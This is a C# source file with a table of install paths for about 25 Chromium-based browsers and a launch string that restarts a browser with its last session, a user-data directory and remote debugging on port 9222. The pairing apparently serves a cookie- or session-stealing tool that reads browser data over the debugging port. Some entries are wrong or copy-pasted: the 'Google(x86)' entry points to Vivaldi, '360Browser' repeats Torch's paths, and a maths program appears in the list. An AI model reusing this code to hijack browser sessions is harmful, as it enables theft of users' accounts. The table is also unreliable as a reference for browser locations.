using System;
using System.Collections.Generic;

namespace SHARP
{
    internal class PathsCV20
    {
      private const int DEBUG_PORT = 9222;
      private static readonly string none = "None";
      public static string commandT = $"--restore-last-session --remote-debugging-port={9222} --user-data-dir=";
      private static readonly string LOCAL_APP_DATA = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      public static readonly Dictionary<string, Dictionary<string, string>> PATHS = new Dictionary<string, Dictionary<string, string>>()
      {
        {
          "Google",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
            },
            {
              "bin3",
              PathsCV20.LOCAL_APP_DATA + "\\Google\\Chrome\\Application\\chrome.exe"
            }
          }
        },
        {
          "Edge",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
            },
            {
              "bin2",
              "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"
            },
            {
              "bin3",
              PathsCV20.none ?? ""
            }
          }
        },
        {
          "Brave",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
            },
            {
              "bin3",
              PathsCV20.LOCAL_APP_DATA + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
            }
          }
        },
        {
          "Opera",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files (x86)\\Opera\\opera.exe"
            },
            {
              "bin2",
              PathsCV20.LOCAL_APP_DATA + "\\Programs\\Opera\\opera.exe"
            },
            {
              "bin3",
              "C:\\Program Files\\Opera\\opera.exe"
            }
          }
        },
        {
          "Yandex",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              PathsCV20.LOCAL_APP_DATA + "\\Yandex\\YandexBrowser\\Application\\browser.exe"
            },
            {
              "bin2",
              "C:\\Program Files\\Yandex\\YandexBrowser\\Application\\browser.exe"
            },
            {
              "bin3",
              PathsCV20.none ?? ""
            }
          }
        },
        {
          "Chromium",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Chromium\\Application\\chrome.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Chromium\\Application\\chrome.exe"
            },
            {
              "bin3",
              PathsCV20.none ?? ""
            }
          }
        },
        {
          "Opera GX",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files (x86)\\Opera GX\\opera.exe"
            },
            {
              "bin2",
              PathsCV20.LOCAL_APP_DATA + "\\Programs\\Opera GX\\opera.exe"
            },
            {
              "bin3",
              "C:\\Program Files\\Opera GX\\opera.exe"
            }
          }
        },
        {
          "Dragon",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Comodo\\Dragon\\dragon.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Comodo\\Dragon\\dragon.exe"
            },
            {
              "bin3",
              "C:\\Program Files\\Comodo\\Comodo Dragon\\dragon.exe"
            }
          }
        },
        {
          "EpicPrivacy",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Epic Privacy Browser\\epic.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Epic Privacy Browser\\epic.exe"
            },
            {
              "bin3",
              PathsCV20.LOCAL_APP_DATA + "\\Epic Privacy Browser\\Application\\epic.exe"
            }
          }
        },
        {
          "Iridium",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Iridium Browser\\iridium.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Iridium Browser\\iridium.exe"
            },
            {
              "bin3",
              PathsCV20.none ?? ""
            }
          }
        },
        {
          "Slimjet",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Slimjet\\slimjet.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Slimjet\\slimjet.exe"
            },
            {
              "bin3",
              PathsCV20.LOCAL_APP_DATA + "\\Slimjet\\slimjet.exe"
            }
          }
        },
        {
          "UR-Browser",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\UR Browser\\application\\ur.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\UR Browser\\application\\ur.exe"
            },
            {
              "bin3",
              PathsCV20.none ?? ""
            }
          }
        },
        {
          "Vivaldi",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Vivaldi\\Application\\vivaldi.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Vivaldi\\Application\\vivaldi.exe"
            },
            {
              "bin3",
              PathsCV20.LOCAL_APP_DATA + "\\Vivaldi\\Application\\vivaldi.exe"
            }
          }
        },
        {
          "Google(x86)",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
            },
            {
              "bin2",
              "C:\\Program Files\\Vivaldi\\Application\\vivaldi.exe"
            },
            {
              "bin3",
              PathsCV20.none ?? ""
            }
          }
        },
        {
          "MapleStudio",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Maple 20XX\\bin.X86_64\\maplew.exe"
            },
            {
              "bin2",
              "C:\\Program Files\\Maple 20XX\\bin\\maple.exe"
            },
            {
              "bin3",
              "C:\\Program Files\\Maple 20XX\\bin.X64\\maplew.exe"
            }
          }
        },
        {
          "7Star",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\7Star Browser\\7star.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\7Star Browser\\7star.exe"
            },
            {
              "bin3",
              PathsCV20.none ?? ""
            }
          }
        },
        {
          "CentBrowser",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\CentBrowser\\chrome.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\CentBrowser\\chrome.exe"
            },
            {
              "bin3",
              PathsCV20.none ?? ""
            }
          }
        },
        {
          "Chedot",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Chedot\\chrome.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Chedot\\chrome.exe"
            },
            {
              "bin3",
              PathsCV20.LOCAL_APP_DATA + "\\Chedot\\chrome.exe"
            }
          }
        },
        {
          "Kometa",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Kometa\\kometa.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Kometa\\kometa.exe"
            },
            {
              "bin3",
              PathsCV20.LOCAL_APP_DATA + "\\Kometa\\kometa.exe"
            }
          }
        },
        {
          "Elements Browser",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Elements Browser\\elements.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Elements Browser\\elements.exe"
            },
            {
              "bin3",
              PathsCV20.none ?? ""
            }
          }
        },
        {
          "Uran",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Uran Browser\\uran.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Uran Browser\\uran.exe"
            },
            {
              "bin3",
              PathsCV20.LOCAL_APP_DATA + "\\Uran Browser\\application\\uran.exe"
            }
          }
        },
        {
          "Amigo",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Amigo\\amigo.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Amigo\\amigo.exe"
            },
            {
              "bin3",
              PathsCV20.LOCAL_APP_DATA + "\\Amigo\\amigo.exe"
            }
          }
        },
        {
          "Atom",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Mail.Ru\\Atom\\application\\atom.exe"
            },
            {
              "bin2",
              "C:\\Program Files\\VK\\VKBrowser\\application\\vk.exe"
            },
            {
              "bin3",
              "C:\\Program Files (x86)\\Mail.Ru\\Atom\\application\\atom.exe"
            }
          }
        },
        {
          "Torch",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Torch\\torch.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Torch\\torch.exe"
            },
            {
              "bin3",
              PathsCV20.LOCAL_APP_DATA + "\\Torch\\torch.exe"
            }
          }
        },
        {
          "360Browser",
          new Dictionary<string, string>()
          {
            {
              "bin1",
              "C:\\Program Files\\Torch\\torch.exe"
            },
            {
              "bin2",
              "C:\\Program Files (x86)\\Torch\\torch.exe"
            },
            {
              "bin3",
              PathsCV20.LOCAL_APP_DATA + "\\Torch\\torch.exe"
            }
          }
        }
      };
    }
}
